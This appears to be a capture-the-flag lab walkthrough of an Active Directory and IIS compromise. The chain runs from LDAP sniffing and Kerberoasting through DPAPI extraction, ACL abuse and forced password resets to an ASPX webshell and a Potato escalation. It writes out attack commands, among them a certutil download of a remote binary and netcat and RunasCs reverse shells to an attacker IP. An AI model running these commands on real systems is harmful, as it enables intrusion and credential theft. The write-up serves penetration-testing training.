# City Council

**Category:** Active Directory, Web Application  
**Techniques:** LDAP traffic sniffing, Kerberoasting, NTLM theft, DPAPI credential extraction, WIM image extraction, ACL abuse chain, Shadow Credentials, ASPX webshell, SeImpersonatePrivilege (Potato)

## TL;DR

A job-application web portal turned out to perform LDAP bind requests on submission, sniffable over the VPN interface to leak a service account's credentials. From there, Kerberoasting cracked a clerk account, whose SMB write access opened the door to NTLM theft, cracking a second user's password. That user's `GenericWrite` over three more accounts led to a wider targeted Kerberoast, cracking two of them. One had read access to a backup share containing `.wim` disk images, extracted to recover local user profiles, one of which had Windows Credential Manager secrets decryptable via DPAPI, yielding a new user's credentials. That user's `WriteDACL` rights re-enabled a disabled account with WinRM access, which then chained into more targeted Kerberoasting, ACL grants, an OU move, a Shadow Credentials attempt (blocked by the DC lacking PKINIT), and finally a direct password reset for a `web_admin` account. Spawning a shell as `web_admin` with `RunasCs` led to an existing ASPX test file in the web root, confirming upload-and-execute access, from which a proper ASPX webshell landed a shell as the IIS app pool identity. A Potato-style exploit against `SeImpersonatePrivilege` completed the compromise.

## Full Walkthrough

### Enumeration

Nmap:

![city-council screenshot 1](images/city-council/city-council-01.png)

**HTTP enumeration:**

![city-council screenshot 2](images/city-council/city-council-02.png)

![city-council screenshot 3](images/city-council/city-council-03.png)

Possible material for username crafting. **SMB enumeration** with `enum4linux`:

![city-council screenshot 4](images/city-council/city-council-04.png)

![city-council screenshot 5](images/city-council/city-council-05.png)

No RPC connection. Checking shares with `smbmap`/`smbclient`:

![city-council screenshot 6](images/city-council/city-council-06.png)

Updating `/etc/hosts`:

![city-council screenshot 7](images/city-council/city-council-07.png)

Directory brute-forcing with Feroxbuster:

![city-council screenshot 8](images/city-council/city-council-08.png)

![city-council screenshot 9](images/city-council/city-council-09.png)

![city-council screenshot 10](images/city-council/city-council-10.png)

![city-council screenshot 11](images/city-council/city-council-11.png)

Something worth following up.

### Downloading the Application

Following the discovered process to download it:

![city-council screenshot 12](images/city-council/city-council-12.png)

![city-council screenshot 13](images/city-council/city-council-13.png)

The binary targets amd64, while the attacking machine is arm64. Running it through `qemu-x86_64`:

![city-council screenshot 14](images/city-council/city-council-14.png)

![city-council screenshot 15](images/city-council/city-council-15.png)

![city-council screenshot 16](images/city-council/city-council-16.png)

Applications can be submitted through it.

![city-council screenshot 17](images/city-council/city-council-17.png)

On submission, a service account, `svc_services_portal`, performs LDAP bind requests behind the scenes.

### LDAP Sniffing

Worth checking whether those LDAP requests can be sniffed:

![city-council screenshot 18](images/city-council/city-council-18.png)

They can. Capturing with Wireshark on the VPN interface while submitting again:

![city-council screenshot 19](images/city-council/city-council-19.png)

Inspecting the captured requests:

![city-council screenshot 20](images/city-council/city-council-20.png)

A username and password are visible in the bind:

```
svc_services_portal : PortAl1337
```

Confirming with CrackMapExec:

![city-council screenshot 21](images/city-council/city-council-21.png)

Valid. Enumerating shares:

![city-council screenshot 22](images/city-council/city-council-22.png)

Users:

![city-council screenshot 23](images/city-council/city-council-23.png)

Checking SYSVOL:

![city-council screenshot 24](images/city-council/city-council-24.png)

Nothing in scripts. WinRM fails.

**BloodHound enumeration** with `bloodhound-ce-python`:

![city-council screenshot 25](images/city-council/city-council-25.png)

Analyzing it:

![city-council screenshot 26](images/city-council/city-council-26.png)

No outbound object control. Trying a password spray against the known users:

![city-council screenshot 27](images/city-council/city-council-27.png)

No matches. **RPC enumeration** for possible info leaks:

![city-council screenshot 28](images/city-council/city-council-28.png)

Querying users leaks nothing further.

### Kerberoasting

Trying Kerberoasting with `impacket-GetUserSPNs`:

![city-council screenshot 29](images/city-council/city-council-29.png)

A hash for `clerk.john` comes back.

**Cracking:**

![city-council screenshot 30](images/city-council/city-council-30.png)

![city-council screenshot 31](images/city-council/city-council-31.png)

No luck with the first attempt. John the Ripper instead:

![city-council screenshot 32](images/city-council/city-council-32.png)

Credentials recovered:

```
Clerk.john : clerkhill
```

Checking shares:

![city-council screenshot 33](images/city-council/city-council-33.png)

Read access on `Uploads`. Checking the contents:

![city-council screenshot 34](images/city-council/city-council-34.png)

A file referencing "writeAccess Jon.Peters" stands out. Inspecting it:

![city-council screenshot 35](images/city-council/city-council-35.png)

Looks like a possible SMB relay angle. WinRM with `clerk.john`:

![city-council screenshot 36](images/city-council/city-council-36.png)

Unsuccessful, and RDP fails too. Worth trying to coerce authentication with [coercer](https://github.com/p0dalirius/coercer):

![city-council screenshot 37](images/city-council/city-council-37.png)

Checking Responder:

![city-council screenshot 38](images/city-council/city-council-38.png)

An NTLMv2 hash for `DC-CC$` comes through. Trying to crack it:

![city-council screenshot 39](images/city-council/city-council-39.png)

No luck. Trying to relay instead: crafting a payload,

![city-council screenshot 40](images/city-council/city-council-40.png)

running `impacket-ntlmrelayx`,

![city-council screenshot 41](images/city-council/city-council-41.png)

and running coerce:

![city-council screenshot 42](images/city-council/city-council-42.png)

![city-council screenshot 43](images/city-council/city-council-43.png)

SMB signing is enabled, so relaying as the DC isn't possible. ASREPRoasting as a further check:

![city-council screenshot 44](images/city-council/city-council-44.png)

Also unsuccessful.

### Access as Jon Peters

Rechecking SMB shares with `smbmap`:

![city-council screenshot 45](images/city-council/city-council-45.png)

Write permissions turn up here that CrackMapExec hadn't surfaced earlier:

![city-council screenshot 46](images/city-council/city-council-46.png)

This opens a much more direct path: SMB poisoning via NTLM theft.

**NTLM theft** with [ntlm_theft](https://github.com/Greenwolf/ntlm_theft): cloning the repo and running it,

![city-council screenshot 47](images/city-council/city-council-47.png)

starting a Responder listener,

![city-council screenshot 48](images/city-council/city-council-48.png)

placing "browse to folder" lure files on the SMB share,

![city-council screenshot 49](images/city-council/city-council-49.png)

and checking Responder:

![city-council screenshot 50](images/city-council/city-council-50.png)

An NTLMv2 hash for `jon.peters` comes back.

**Cracking:**

![city-council screenshot 51](images/city-council/city-council-51.png)

![city-council screenshot 52](images/city-council/city-council-52.png)

No luck with the first tool. John the Ripper:

![city-council screenshot 53](images/city-council/city-council-53.png)

Password recovered:

```
jon.peters : 1234heresjonny
```

Checking BloodHound:

![city-council screenshot 54](images/city-council/city-council-54.png)

`jon.peters` has `GenericWrite` over three users, all members of the same groups with no outbound object control of their own, so any of them is a reasonable next target. RDP and WinRM both fail for Jon directly. Noted: Peters (like the other three) is a member of the Certificate Service group:

![city-council screenshot 55](images/city-council/city-council-55.png)

Worth checking for AD CS vulnerabilities with Certipy:

![city-council screenshot 56](images/city-council/city-council-56.png)

That attempt fails. Retrying with explicit LDAP scheme and port:

![city-council screenshot 57](images/city-council/city-council-57.png)

That works. Checking the resulting JSON:

![city-council screenshot 58](images/city-council/city-council-58.png)

Nothing usable there.

### Access as Maria.Clerk and Nina.Soto

Turning to the `GenericWrite` targets instead, starting with `maria.clerk`:

![city-council screenshot 59](images/city-council/city-council-59.png)

![city-council screenshot 60](images/city-council/city-council-60.png)

**Targeted Kerberoasting** with `targetedkerberoast.py`:

![city-council screenshot 61](images/city-council/city-council-61.png)

![city-council screenshot 62](images/city-council/city-council-62.png)

![city-council screenshot 63](images/city-council/city-council-63.png)

![city-council screenshot 64](images/city-council/city-council-64.png)

Four hashes come back, including the one already cracked for `clerk.john`.

**Cracking** with John:

![city-council screenshot 65](images/city-council/city-council-65.png)

Maria's and Nina's passwords both crack:

```
maria.clerk : mariadbzt1221
nina.soto : 123nina321
```

![city-council screenshot 66](images/city-council/city-council-66.png)

Confirmed. WinRM and RDP both fail for these accounts too. Checking shares instead:

![city-council screenshot 67](images/city-council/city-council-67.png)

Nina has read access on a `Backups` share. Checking it:

![city-council screenshot 68](images/city-council/city-council-68.png)

![city-council screenshot 69](images/city-council/city-council-69.png)

![city-council screenshot 70](images/city-council/city-council-70.png)

`.wim` files: a Windows Imaging Format archive that stores disk images based on files rather than raw sectors, used for fast OS deployment and backup. On Linux, they can be extracted with `wimlib-imagex` (`wimapply`, `wimextract`) or 7-Zip.

### Profile Dump Extraction: sam.brooks

Checking how many images are in the file with `wiminfo`:

![city-council screenshot 71](images/city-council/city-council-71.png)

Just one, index 1. Extracting it with `wimextract`:

![city-council screenshot 72](images/city-council/city-council-72.png)

![city-council screenshot 73](images/city-council/city-council-73.png)

The `/Users` directory of `sam.brooks` comes out of this. Checking its contents:

![city-council screenshot 74](images/city-council/city-council-74.png)

A message sits on the desktop:

![city-council screenshot 75](images/city-council/city-council-75.png)

Worth noting for later, possibly an ASPX shell upload opportunity down the line.

### Profile Dump Extraction: clerk.john

Repeating the same extraction for the clerk profile:

![city-council screenshot 76](images/city-council/city-council-76.png)

![city-council screenshot 77](images/city-council/city-council-77.png)

An "Emma Hayes temporary access" message sits on the desktop. Checking it:

![city-council screenshot 78](images/city-council/city-council-78.png)

Emma's credentials appear to be stored in Windows Credential Manager.

### Access as Emma.Hayes

**DPAPI credential dumping**, following [HackTricks' DPAPI methodology](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html): the master key needs to be found first, then the encrypted data.

The master key:

```
clerk/AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103
```

![city-council screenshot 79](images/city-council/city-council-79.png)

![city-council screenshot 80](images/city-council/city-council-80.png)

The encrypted data:

```
/home/zulema/Hacksmarter/city/clerk/AppData/Roaming/Microsoft/Credentials
```

![city-council screenshot 81](images/city-council/city-council-81.png)

**Decryption**, offline with `impacket-dpapi`: decrypting the master key first,

```
impacket-dpapi masterkey -file de222e76-cb5d-418f-a1c2-7e4e9dfe29e1 -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password "clerkhill"
```

![city-council screenshot 82](images/city-council/city-council-82.png)

A decrypted master key comes back in hex. Using it to decrypt the credentials blob:

```
impacket-dpapi credential -file 03128079C6E14F37F5AEBDD69E344291 -key 0xedfc873c4b843cb27b48cb55d829bc24c8d2be3fd50ce2aa7ba72b8da6ec65afd41412dfecd16f38a120cadf4089dabb9a1817874e37bbf0d6861117a39dfbbd
```

![city-council screenshot 83](images/city-council/city-council-83.png)

Emma's credentials:

```
emma.hayes : !Gemma4James!
```

Confirming with CrackMapExec:

![city-council screenshot 84](images/city-council/city-council-84.png)

### WinRM Access: Enabling sam.brooks

![city-council screenshot 85](images/city-council/city-council-85.png)

Emma holds a wide set of rights: `WriteDACL` on `sam.brooks`, `alex.king`, `rita.cho`, and `CityOPS`, plus `GenericWrite` on `Quarantine` and `web_admin`. Worth figuring out which is most useful. Inspecting further:

![city-council screenshot 86](images/city-council/city-council-86.png)

`sam.brooks` is a member of Remote Management Users, a direct path to WinRM. Abusing the `WriteDACL` right:

![city-council screenshot 87](images/city-council/city-council-87.png)

![city-council screenshot 88](images/city-council/city-council-88.png)

Granting full control:

```
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'
```

![city-council screenshot 89](images/city-council/city-council-89.png)

![city-council screenshot 90](images/city-council/city-council-90.png)

Forcing a password change:

```
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

![city-council screenshot 91](images/city-council/city-council-91.png)

Checking the result:

![city-council screenshot 92](images/city-council/city-council-92.png)

The account is disabled. Enabling it with BloodyAD, per its [user guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide):

![city-council screenshot 93](images/city-council/city-council-93.png)

```
bloodyad -H 10.0.26.144 -d city.local -u emma.hayes -p \!Gemma4James\! msldap enableuser "CN=SAM BROOKS,OU=CITYOPS,DC=CITY,DC=LOCAL"
```

![city-council screenshot 94](images/city-council/city-council-94.png)

Enabled. WinRM:

![city-council screenshot 95](images/city-council/city-council-95.png)

Checking `/temp`:

![city-council screenshot 96](images/city-council/city-council-96.png)

Nothing inside. Moving on.

### Access as web_admin

**Targeted Kerberoasting** as Emma:

![city-council screenshot 97](images/city-council/city-council-97.png)

![city-council screenshot 98](images/city-council/city-council-98.png)

A hash for `web_admin` comes back. Trying to crack it:

![city-council screenshot 99](images/city-council/city-council-99.png)

No luck. **Enumerating writable AD objects** in detail as `emma.hayes` with BloodyAD:

```
bloodyad -H 10.0.26.144 -d city.local -u emma.hayes -p \!Gemma4James\! get writable --detail
```

![city-council screenshot 100](images/city-council/city-council-100.png)

**PowerView from Linux**, via [powerview.py](https://github.com/aniqfakhrul/powerview.py):

![city-council screenshot 101](images/city-council/city-council-101.png)

```
powerview city.local/emma.hayes:\!Gemma4James\!@10.0.26.144
```

![city-council screenshot 102](images/city-council/city-council-102.png)

An LDAP-style terminal comes up. Since `web_admin` is known to sit in the Quarantine OU (from the earlier email), moving it into City Ops looks worth trying:

```
Set-DomainObjectDN -Identity "web_admin" -DestinationDN 'OU=CityOps,DC=city,DC=local'
```

![city-council screenshot 103](images/city-council/city-council-103.png)

That fails despite having `GenericWrite` on the object itself. Reviewing BloodHound again clarifies why:

![city-council screenshot 104](images/city-council/city-council-104.png)

`WriteDACL` on the City Ops OU is needed first, granting full control there before the move will succeed.

**Granting full control on City Ops:**

![city-council screenshot 105](images/city-council/city-council-105.png)

```
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'
```

![city-council screenshot 106](images/city-council/city-council-106.png)

![city-council screenshot 107](images/city-council/city-council-107.png)

Retrying the move:

![city-council screenshot 108](images/city-council/city-council-108.png)

Success.

**Shadow Credentials attack:** with `GenericWrite` on `web_admin`, a Shadow Credentials attack becomes available. Rather than stealing or changing the target's password, this appends an alternate certificate-based credential to the account, allowing indefinite impersonation even if the password changes later.

![city-council screenshot 109](images/city-council/city-council-109.png)

Using `pywhisker.py`:

```
python3 pywhisker.py -d city.local -u emma.hayes -p \!Gemma4James\! --target web_admin --action add
```

![city-council screenshot 110](images/city-council/city-council-110.png)

![city-council screenshot 111](images/city-council/city-council-111.png)

Using PKINIT to authenticate with the resulting `.pfx`:

![city-council screenshot 112](images/city-council/city-council-112.png)

The domain controller doesn't support PKINIT, likely lacking a valid DC authentication certificate. Trying `certipy-ad auth` instead:

```
certipy-ad auth -pfx ../fqFZxbR9.pfx -password ZcZ80eWllTlpvXu76yln -dc-ip 10.0.26.144 -domain city.local -username web_admin
```

![city-council screenshot 113](images/city-council/city-council-113.png)

Same result. The certificate-based route isn't viable here.

**Password change instead**, directly with `net rpc password`:

```
net rpc password "web_admin" "zulema123" -U city.council/emma.hayes%\!Gemma4James\! -S "DC-CC.city.local"
```

![city-council screenshot 114](images/city-council/city-council-114.png)

Much simpler than the certificate route. Confirming:

![city-council screenshot 115](images/city-council/city-council-115.png)

Password changed. WinRM and RDP both fail for `web_admin` directly. Spawning a shell some other way, trying `Invoke-RunasCs.ps1` from the `sam.brooks` WinRM session:

![city-council screenshot 116](images/city-council/city-council-116.png)

![city-council screenshot 117](images/city-council/city-council-117.png)

The `.ps1` version doesn't work. Switching to the compiled `.exe`, per [RunasCs](https://github.com/antonioCoco/RunasCs/blob/master/README.md): transferring the source,

![city-council screenshot 118](images/city-council/city-council-118.png)

compiling it with `csc.exe`:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
```

![city-council screenshot 119](images/city-council/city-council-119.png)

Running it:

![city-council screenshot 120](images/city-council/city-council-120.png)

Spawning `cmd.exe` directly doesn't produce visible output, so a reverse shell is used instead:

![city-council screenshot 121](images/city-council/city-council-121.png)

```
./RunasCs.exe web_admin zulema123 cmd.exe -r 10.200.74.115:1234
```

![city-council screenshot 122](images/city-council/city-council-122.png)

Checking Penelope:

![city-council screenshot 123](images/city-council/city-council-123.png)

Shell obtained as `web_admin`.

### Access as IIS AppPool

A `test.aspx` file sits in `/inetpub/wwwroot/uploads`, a possible pre-existing shell:

![city-council screenshot 124](images/city-council/city-council-124.png)

Checking whether new files can be placed there and opened from the web:

![city-council screenshot 125](images/city-council/city-council-125.png)

![city-council screenshot 126](images/city-council/city-council-126.png)

Confirmed. Uploading a proper ASPX shell for a reverse connection: transferring `cmdasp.aspx`,

![city-council screenshot 127](images/city-council/city-council-127.png)

opening it from the web:

![city-council screenshot 128](images/city-council/city-council-128.png)

![city-council screenshot 129](images/city-council/city-council-129.png)

Impersonate privileges are present in this context. Transferring `nc.exe` and spawning a reverse shell: creating a `/Temp` directory and fetching the binary,

```
certutil.exe -urlcache -f http://10.0.0.5/40564.exe C:/Temp/bad.exe
```

then starting Penelope and running:

```
C:/Temp/nc.exe 10.200.74.115 9090 -e cmd
```

![city-council screenshot 130](images/city-council/city-council-130.png)

Shell obtained as the IIS app pool identity.

### Full System Compromise

The final step is abusing `SeImpersonatePrivilege` with a Potato-style exploit (PrintSpoofer or similar), uploaded directly through Penelope:

![city-council screenshot 131](images/city-council/city-council-131.png)

Found under Penelope's "modules":

![city-council screenshot 132](images/city-council/city-council-132.png)

Uploading it with `run upload_potato`:

![city-council screenshot 133](images/city-council/city-council-133.png)

Entering the session and running it:

![city-council screenshot 134](images/city-council/city-council-134.png)

![city-council screenshot 135](images/city-council/city-council-135.png)

![city-council screenshot 136](images/city-council/city-council-136.png)

![city-council screenshot 137](images/city-council/city-council-137.png)

Full system compromise.

---

*Educational write-up from an authorized lab environment (HackSmarter). Not a guide for unauthorized access.*
